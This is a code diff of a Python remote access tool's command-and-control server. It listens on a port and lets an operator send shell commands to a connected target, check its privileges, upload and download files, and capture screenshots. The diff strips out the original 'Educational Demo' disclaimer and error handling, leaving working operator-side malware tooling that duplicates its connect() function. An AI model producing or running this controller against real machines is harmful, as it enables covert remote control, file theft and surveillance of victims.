@@ -1,257 +1,177 @@
 import socket
 import os
 import base64
-import sys
 from datetime import datetime
-import argparse
 
 
-def receive_all(sock, buffer_size=4096, end_marker=b"ENDOFFILE"):
-    """
-    Receive data until end marker is encountered.
-    
-    Args:
-        sock: Socket connection
-        buffer_size: Size of each chunk
-        end_marker: Sequence indicating end of data
-        
-    Returns:
-        bytes: Complete received data
-    """
+def receive_all(sock, buffer_size=4096):
     data = b""
     while True:
-        try:
-            part = sock.recv(buffer_size)
-            if not part:
-                break
-                
-            if end_marker in part:
-                # Find the exact position of the end marker
-                marker_pos = part.find(end_marker)
-                data += part[:marker_pos]
-                break
-                
-            data += part
-        except socket.timeout:
-            # If we have a socket timeout, check if we have received anything
-            if data:
-                break
-                
+        part = sock.recv(buffer_size)
+        if part.endswith(b"ENDOFFILE"):
+            data += part[:-9]
+            break
+        data += part
     return data
 
 
-def print_banner():
-    """Display initial banner with usage information."""
-    banner = """
-    ┌──────────────────────────────────────────────────┐
-    │      Remote Access Tool - Educational Demo       │
-    │                                                  │
-    │  DISCLAIMER: For authorized use in controlled    │
-    │  environments only. Unauthorized use is illegal. │
-    └──────────────────────────────────────────────────┘
-    """
-    print(banner)
+import argparse
 
+def connect():
+    print("[+] Starting server on port 8080...")
+    server_socket = socket.socket()
+    server_socket.bind(("192.168.19.123", 8080))
+    server_socket.listen(1)
+    connection, address = server_socket.accept()
+    print(f"[+] Connection from {address}")
 
-def print_help():
-    """Print available commands and their usage."""
-    help_text = """
+    print(connection.recv(1024).decode())
+    print("[+] Type 'help' to see commands")
+
+    while True:
+        try:
+            command = input("Shell > ")
+
+            if command == "help":
+                print("""
 Commands:
-  help                    - Show this help menu
-  pwd                     - Get current directory on target
-  ls                      - List files on target
-  cd <dir>                - Change directory on target
-  checkadmin              - Check privilege level on target
+  pwd                     - Get current directory
+  ls                      - List files
+  cd <dir>                - Change directory
+  checkadmin              - Check privileges
   upload <local> <remote> - Send file to target
   download <remote> <local> - Get file from target
   screenshot              - Capture screenshot from target
-  terminate               - Exit and close connection
-  exit                    - Same as terminate
-"""
-    print(help_text)
-
-
-def start_server(host="192.168.19.139", port=8080):
-    """
-    Start the server and handle client connections.
-    
-    Args:
-        host: Interface to listen on (default: 192.168.19.139)
-        port: Port number to listen on
-        
-    Note:
-        Server expects connections from subnet 192.168.19.0/24
-        Server IP is configured as 192.168.19.139
-    """
-    print_banner()
-    print(f"[+] Starting server on {host}:{port}...")
-    print(f"[+] Server IP address: 192.168.19.139/24")
-    
-    try:
-        # Create socket with timeout
-        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        server_socket.bind((host, port))
-        server_socket.listen(1)
-        
-        print(f"[+] Listening for connections...")
-        connection, address = server_socket.accept()
-        connection.settimeout(5)  # Set timeout for operations
-        
-        print(f"[+] Connection established from {address[0]}:{address[1]}")
-        
-        # Receive and display initial system information
-        initial_info = connection.recv(1024).decode()
-        print(f"[*] {initial_info}")
-        print("[+] Type 'help' to see available commands")
-        
-        handle_connection(connection)
-        
-    except socket.error as e:
-        print(f"[!] Socket error: {e}")
-    except KeyboardInterrupt:
-        print("\n[!] Server terminated by user")
-    finally:
-        try:
-            connection.close()
-        except:
-            pass
-        try:
-            server_socket.close()
-        except:
-            pass
-
-
-def handle_connection(connection):
-    """
-    Handle commands for an established connection.
-    
-    Args:
-        connection: Active socket connection to client
-    """
-    while True:
-        try:
-            command = input("\nShell > ").strip()
-            
-            # Handle empty commands
-            if not command:
+  terminate               - Exit
+""")
                 continue
-                
-            # Handle local commands
-            if command == "help":
-                print_help()
-                continue
-                
-            if command in ["exit", "terminate"]:
-                print("[*] Terminating session...")
-                connection.send("terminate".encode())
+
+            if command == "terminate":
+                connection.send(command.encode())
                 break
-                
-            # Handle file upload
+
             elif command.startswith("upload "):
-                parts = command.split(maxsplit=2)
-                if len(parts) != 3:
-                    print("[!] Usage: upload <local_file> <remote_path>")
+                _, local, remote = command.split(maxsplit=2)
+                if not os.path.exists(local):
+                    print("[!] File not found.")
                     continue
-                    
-                _, local_file, remote_path = parts
-                
-                if not os.path.exists(local_file):
-                    print(f"[!] Local file not found: {local_file}")
-                    continue
-                    
-                print(f"[*] Reading file: {local_file}")
-                try:
-                    with open(local_file, "rb") as f:
-                        file_data = f.read()
-                        
-                    encoded = base64.b64encode(file_data).decode()
-                    print(f"[*] Uploading {len(file_data)} bytes to {remote_path}")
-                    connection.send(f"upload {remote_path} {encoded}".encode())
-                    
-                    response = connection.recv(1024).decode()
-                    print(response)
-                except Exception as e:
-                    print(f"[!] Upload failed: {e}")
-                    
-            # Handle file download
+                with open(local, "rb") as f:
+                    encoded = base64.b64encode(f.read()).decode()
+                connection.send(f"upload {remote} {encoded}".encode())
+                print(connection.recv(1024).decode())
+
             elif command.startswith("download "):
-                parts = command.split(maxsplit=2)
-                if len(parts) != 3:
-                    print("[!] Usage: download <remote_file> <local_path>")
-                    continue
-                    
-                _, remote_file, local_path = parts
-                
-                print(f"[*] Requesting file: {remote_file}")
-                connection.send(f"download {remote_file}".encode())
-                
+                _, remote, local = command.split(maxsplit=2)
+                connection.send(f"download {remote}".encode())
                 response = connection.recv(1024).decode()
                 if response.startswith("[!]"):
                     print(response)
                     continue
-                    
-                print(f"[*] {response}")
-                print("[*] Receiving data...")
-                
+                print(response)
                 data = receive_all(connection)
-                if not data:
-                    print("[!] No data received")
-                    continue
-                    
-                try:
-                    decoded = base64.b64decode(data)
-                    with open(local_path, "wb") as f:
-                        f.write(decoded)
-                    print(f"[+] File saved to {local_path} ({len(decoded)} bytes)")
-                except Exception as e:
-                    print(f"[!] Failed to save file: {e}")
-                    
-            # Handle screenshot
+                decoded = base64.b64decode(data)
+                with open(local, "wb") as f:
+                    f.write(decoded)
+                print(f"[+] File saved to {local}")
+
             elif command == "screenshot":
-                print("[*] Requesting screenshot...")
                 connection.send(command.encode())
-                
-                print("[*] Receiving screenshot data...")
                 data = receive_all(connection)
-                
-                if not data:
-                    print("[!] No screenshot data received")
-                    continue
-                    
-                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-                filename = f"screenshot_{timestamp}.png"
-                
-                try:
-                    with open(filename, "wb") as f:
-                        f.write(data)
-                    print(f"[+] Screenshot saved as {filename} ({len(data)} bytes)")
-                except Exception as e:
-                    print(f"[!] Failed to save screenshot: {e}")
-                    
-            # Handle all other commands
+                filename = f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
+                with open(filename, "wb") as f:
+                    f.write(data)
+                print(f"[+] Screenshot saved as {filename}")
+
             else:
                 connection.send(command.encode())
-                try:
-                    response = connection.recv(4096).decode()
-                    print(response)
-                except socket.timeout:
-                    print("[!] Response timeout - command may still be running")
-                    
-        except KeyboardInterrupt:
-            print("\n[!] Use 'exit' or 'terminate' to close the connection")
-        except ConnectionResetError:
-            print("[!] Connection lost")
-            break
+                print(connection.recv(4096).decode())
+
         except Exception as e:
             print(f"[!] Error: {e}")
             break
 
+    connection.close()
+
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Remote Access Server - Educational Demo")
-    parser.add_argument("-p", "--port", type=int, default=8080, help="Port to listen on (default: 8080)")
-    parser.add_argument("--host", default="192.168.19.123", help="Interface to listen on (default: 192.168.19.123)")
-    
+    parser = argparse.ArgumentParser(description="Remote Access Server")
+    parser.add_argument("--host", default="0.0.0.0", help="Interface to listen on")
+    parser.add_argument("--port", type=int, default=8080, help="Port to listen on")
     args = parser.parse_args()
-    start_server(host=args.host, port=args.port)
+
+    def connect():
+        print("[+] Starting server on port {}...".format(args.port))
+        server_socket = socket.socket()
+        server_socket.bind((args.host, args.port))
+        server_socket.listen(1)
+        connection, address = server_socket.accept()
+        print(f"[+] Connection from {address}")
+
+        print(connection.recv(1024).decode())
+        print("[+] Type 'help' to see commands")
+
+        while True:
+            try:
+                command = input("Shell > ")
+
+                if command == "help":
+                    print("""
+Commands:
+  pwd                     - Get current directory
+  ls                      - List files
+  cd <dir>                - Change directory
+  checkadmin              - Check privileges
+  upload <local> <remote> - Send file to target
+  download <remote> <local> - Get file from target
+  screenshot              - Capture screenshot from target
+  terminate               - Exit
+""")
+                    continue
+
+                if command == "terminate":
+                    connection.send(command.encode())
+                    break
+
+                elif command.startswith("upload "):
+                    _, local, remote = command.split(maxsplit=2)
+                    if not os.path.exists(local):
+                        print("[!] File not found.")
+                        continue
+                    with open(local, "rb") as f:
+                        encoded = base64.b64encode(f.read()).decode()
+                    connection.send(f"upload {remote} {encoded}".encode())
+                    print(connection.recv(1024).decode())
+
+                elif command.startswith("download "):
+                    _, remote, local = command.split(maxsplit=2)
+                    connection.send(f"download {remote}".encode())
+                    response = connection.recv(1024).decode()
+                    if response.startswith("[!]"):
+                        print(response)
+                        continue
+                    print(response)
+                    data = receive_all(connection)
+                    decoded = base64.b64decode(data)
+                    with open(local, "wb") as f:
+                        f.write(decoded)
+                    print(f"[+] File saved to {local}")
+
+                elif command == "screenshot":
+                    connection.send(command.encode())
+                    data = receive_all(connection)
+                    filename = f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
+                    with open(filename, "wb") as f:
+                        f.write(data)
+                    print(f"[+] Screenshot saved as {filename}")
+
+                else:
+                    connection.send(command.encode())
+                    print(connection.recv(4096).decode())
+
+            except Exception as e:
+                print(f"[!] Error: {e}")
+                break
+
+        connection.close()
+
+    connect()
